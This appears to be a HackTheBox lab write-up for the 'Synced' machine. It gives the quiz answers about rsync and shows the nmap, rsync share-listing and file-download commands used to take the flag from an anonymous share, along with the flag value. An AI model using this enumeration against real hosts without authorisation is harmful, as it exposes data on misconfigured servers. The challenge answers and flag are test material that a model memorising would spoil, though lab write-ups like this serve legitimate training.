---
title: HTB - Synced
date: 2023-08-17
categories: [HackTheBox, Machines]
tags: [rsync]
---

# Synced

What is the default port for rsync?

`873`

How many TCP ports are open on the remote host?

`1`

What is the protocol version used by rsync on the remote machine?

`31`

What is the most common command name on Linux to interact with rsync?

`rsync`

What credentials do you have to pass to rsync in order to use anonymous authentication?

`None`

What is the option to only list shares and files on rsync?

`--list-only`

Submit root flag

```bash
$ nmap -sV -p- <ip>
...
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

$ rsync --list-only <ip>::
public         	Anonymous Share

$ rsync --list-only <ip>::public
drwxr-xr-x          4,096 2022/10/24 23:02:23 .
-rw-r--r--             33 2022/10/24 22:32:03 flag.txt

$ rsync -azvh None@<ip>::public ./
receiving incremental file list
./
flag.txt

sent 50 bytes  received 158 bytes  24.47 bytes/sec
total size is 33  speedup is 0.16

$ cat flag.txt
72eaf5344ebb84908ae543a719830519
```
